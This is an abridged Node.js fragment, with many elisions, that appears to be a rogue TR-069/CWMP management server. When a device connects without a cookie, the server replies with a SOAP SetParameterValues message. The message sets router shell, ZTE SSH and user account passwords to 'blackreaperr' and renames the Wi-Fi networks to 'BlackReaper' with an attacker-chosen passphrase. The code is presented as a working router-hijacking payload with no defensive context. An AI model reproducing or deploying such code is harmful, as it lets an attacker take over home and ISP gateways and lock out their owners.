...
const requestListener = function (req, res) {
  ...
  if(req.headers['cookie'] === undefined){
    ...
    res.end('<SOAP-ENV:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:cwmp="urn:dslforum-org:cwmp-1-0" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><SOAP-ENV:Header><cwmp:ID SOAP:mustUnderstand="1">1</cwmp:ID><cwmp:NoMoreRequest>0</cwmp:NoMoreRequest></SOAP-ENV:Header><SOAP-ENV:Body><cwmp:SetParameterValues><ParameterList>'+
      ...
      '<ParameterValueStruct><Name>InternetGatewayDevice.X_TT.Configuration.Shell.Password</Name><Value xsi:type="xsd:string">blackreaperr</Value></ParameterValueStruct>'+
      ...
      '<ParameterValueStruct><Name>InternetGatewayDevice.X_ZTE-COM_SSH.Password</Name><Value xsi:type="xsd:string">blackreaperr</Value></ParameterValueStruct>'+
      ...
      '<ParameterValueStruct><Name>InternetGatewayDevice.X_TT.Users.User.2.Password</Name><Value xsi:type="xsd:string">blackreaperr</Value></ParameterValueStruct>'+
      ...
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.SSID</Name><Value xsi:type="xsd:string">BlackReaper-5GHZ</Value></ParameterValueStruct>'+
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.KeyPassphrase</Name><Value xsi:type="xsd:string">BlackReaper4</Value></ParameterValueStruct>'+
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1.KeyPassphrase</Name><Value xsi:type="xsd:string">BlackReaper4</Value></ParameterValueStruct>'+
      ...
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.2.SSID</Name><Value xsi:type="xsd:string">BlackReaper-24GHZ</Value></ParameterValueStruct>'+
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.2.KeyPassphrase</Name><Value xsi:type="xsd:string">BlackReaper4</Value></ParameterValueStruct>'+
      '<ParameterValueStruct><Name>InternetGatewayDevice.LANDevice.1.WLANConfiguration.2.PreSharedKey.1.KeyPassphrase</Name><Value xsi:type="xsd:string">BlackReaper4</Value></ParameterValueStruct>'+
